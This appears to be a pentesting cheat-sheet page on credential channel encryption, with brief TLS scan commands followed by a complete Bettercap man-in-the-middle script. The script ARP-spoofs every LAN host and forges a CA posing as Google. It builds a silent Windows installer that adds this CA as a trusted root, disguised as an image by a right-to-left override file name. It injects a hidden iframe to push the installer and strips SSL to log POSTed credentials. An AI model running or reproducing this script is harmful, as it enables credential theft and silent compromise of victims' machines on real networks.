# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Scan Vulns

#### [cURL](https://curl.se/)

```bash
curl -vk --tlsv1.1 https://$WEBSITE; \
curl -vk --tlsv1.2 https://$WEBSITE; \
curl -vk --tlsv1.3 https://$WEBSITE;
```

#### [testssl.sh](https://github.com/testssl/testssl.sh)

```bash
testssl $WEBSITE
```

#### [SSLyze](https://github.com/nabla-c0d3/sslyze)

```bash
sslyze --regular $WEBSITE
```

### Man In The Middle

#### [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-bettercap.sh
```

```bash
#!/bin/bash
set -euo pipefail

# ========================
# --- CONFIG & COLORS ---
# ========================
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

WINEARCH=win64 wineboot --init
WINEPREFIX="$HOME/.wine"
MITM_DIR="/tmp/mitm"
RTLO=$'\xE2\x80\xAE'
BUILD_DIR="$WINEPREFIX/drive_c/pyinstaller-build"
ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
CA_DIR="$HOME/bettercap-ca"
CA_KEY="$CA_DIR/ca.key.pem"
CA_CERT_PEM="$CA_DIR/ca.cert.pem"
CA_CERT_CER="$CA_DIR/ca.cert.cer"

# ========================
# --- ROOT CHECK ---
# ========================
if [[ "$(id -u)" -ne 0 ]]; then
    color_print RED "[X] Please run as ROOT."
    exit 1
fi

# ========================
# --- PYTHON CHECK ---
# ========================
if [ ! -d "$BUILD_DIR" ]; then
    wget https://www.python.org/ftp/python/3.9.1/python-3.9.1-amd64.exe -O /tmp/python39.exe
    wine /tmp/python39.exe /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
    wine python -m pip install --upgrade pip setuptools wheel
    wine python -m pip install pyinstaller
fi

# ========================
# --- NETWORK INFO ---
# ========================
clear
IFACE=$(ip route | awk '/^default/ {print $5; exit}')
LAN=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
color_print GREEN "[*] Interface: $IFACE"
color_print GREEN "[*] Local IP: $LAN"

# ========================
# --- CLEANUP OLD FILES ---
# ========================
color_print YELLOW "[*] Cleaning old files..."
rm -rf "$MITM_DIR" "$BUILD_DIR"
mkdir -p "$MITM_DIR" "$BUILD_DIR"

# ========================
# --- GENERATE FAKE CERTIFICATE ---
# ========================
color_print CYAN "[*] Generating fake certificate..."
mkdir -p "$CA_DIR"
openssl genrsa -out "$CA_KEY" 4096
openssl req -x509 -new -nodes \
    -key "$CA_KEY" \
    -sha256 \
    -days 3650 \
    -out "$CA_CERT_PEM" \
    -subj "/C=US/ST=California/L=Mountain View/O=Google LLC/OU=Google Trust Services/CN=Google Internet Authority G3"

openssl x509 -outform der -in "$CA_CERT_PEM" -out "$CA_CERT_CER"

# ========================
# --- CREATE ICON ---
# ========================
color_print CYAN "[*] Downloading & creating icon..."
wget -q -O "$MITM_DIR/google.jpg" "$ICON_URL"
convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "$MITM_DIR/google.ico"

# ========================
# --- BUILD WINDOWS INSTALLER ---
# ========================
color_print GREEN "[*] Building Windows installer..."
CERT_B64=$(base64 -w0 "$CA_CERT_CER")

cat > "$MITM_DIR/cert-installer.py" <<EOF
import os, subprocess, tempfile, base64

CERT_B64 = """$CERT_B64"""

path = os.path.join(tempfile.gettempdir(), "google.cer")
with open(path, "wb") as f:
    f.write(base64.b64decode(CERT_B64))

subprocess.run(
    ["certutil", "-addstore", "-f", "Root", path],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
)

try:
    os.remove(path)
except FileNotFoundError:
    pass
EOF

cd "$BUILD_DIR"
cp "$MITM_DIR/cert-installer.py" "$BUILD_DIR/cert_installer.py"
cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"

wine pyinstaller --onefile --noconfirm --noconsole \
    --icon "C:\\pyinstaller-build\\google.ico" \
    --name "cert_installer.exe" \
    "C:\\pyinstaller-build\\cert_installer.py"

cp -r "$BUILD_DIR/dist/cert_installer.exe" "$MITM_DIR/cert_installer.exe"

# ========================
# --- CREATE RAR SFX ---
# ========================
color_print CYAN "[*] Creating SFX archive..."
cat > "$MITM_DIR/sfx.txt" <<EOF
;The comment below contains SFX script commands
Setup=cert_installer.exe
Presetup=google.jpg
TempMode
Silent=1
Overwrite=1
Update=U
SetupIcon=google.ico
EOF

cd "$MITM_DIR"
rar a -sfx -z"$MITM_DIR/sfx.txt" \
    "/var/www/html/google-update${RTLO}gpj.exe" \
    "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico"

# ========================
# --- RESTART APACHE ---
# ========================
color_print GREEN "[*] Restarting Apache..."
service apache2 restart

# ========================
# --- GENERATE HOOK.JS & CAPLET ---
# ========================
color_print CYAN "[*] Scanning network..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
    awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
    grep -v "$LAN" | sort -u | paste -sd ',' -)

cat > "$MITM_DIR/hook.js" <<EOF
const iframe = document.createElement('iframe');
iframe.src = 'http://$LAN/google-update${RTLO}gpj.exe';
iframe.width = '0';
iframe.height = '0';
iframe.style.display = 'none';
document.body.appendChild(iframe);
EOF

cat > "$MITM_DIR/fallback.cap" <<EOF
set arp.spoof.targets $TARGETS
set arp.spoof.internal true
arp.spoof on

set https.proxy.certificate $CA_CERT_PEM
set https.proxy.key $CA_KEY

set http.proxy.script $MITM_DIR/hook.js
set https.proxy.script $MITM_DIR/hook.js

http.proxy on
https.proxy on

set http.proxy.verbose true

set events.stream.output /tmp/http-post.log
set events.stream.filter "http.request and http.request.method == 'POST'"

set https.proxy.sslstrip true

events.stream on
net.probe on
EOF

# ========================
# --- LAUNCH BETTERCAP ---
# ========================
color_print GREEN "[*] Launching Bettercap..."
sysctl -w net.ipv4.ip_forward=1
bettercap -iface "$IFACE" -caplet "$MITM_DIR/fallback.cap"
```

_Run & Execute_

```bash
sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
```
